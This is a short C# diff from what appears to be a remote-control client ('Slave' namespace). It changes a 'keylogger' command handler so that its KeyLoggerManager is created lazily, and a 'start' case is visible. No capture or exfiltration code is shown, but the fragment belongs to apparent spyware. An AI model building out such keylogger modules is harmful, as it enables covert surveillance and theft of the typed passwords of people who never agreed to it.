@@ -10,10 +10,13 @@ namespace Slave.Commands.KeyLogger
     {
         public string name { get; } = "keylogger";
 
-        public KeyLoggerManager keyLoggerManager { get; set; } = new KeyLoggerManager();
+        public KeyLoggerManager keyLoggerManager { get; set; }
 
         public void Process(List<string> args)
         {
+            if (keyLoggerManager == null)
+                keyLoggerManager = new KeyLoggerManager();
+
             switch (args[0])
             {
                 case "start":
